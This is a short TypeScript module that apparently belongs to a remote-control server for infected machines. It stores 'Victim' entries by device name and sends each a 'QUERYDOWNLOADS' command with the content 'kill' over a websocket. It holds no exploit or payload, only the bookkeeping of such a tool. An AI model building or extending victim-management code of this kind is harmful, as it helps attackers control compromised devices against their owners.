import Victim from "./classes/Victim";

var victims: Map<string, Victim> = new Map();

export function initVictims(){
    console.log("Victims System Initiated");
}

export function addVictim(victim: Victim){
    victims.set(victim.devName, victim);
}

export function getVictim(name: string): Victim{
    return victims.get(name) as Victim;
}

export function deleteVictim(name: string){
    victims.delete(name);
}

export function sendDownloadQueryToVictim(victim: Victim){
    victim.ws.send(JSON.stringify({
        "messageType": "QUERYDOWNLOADS",
        "content": "kill"
    }))
}

export default victims;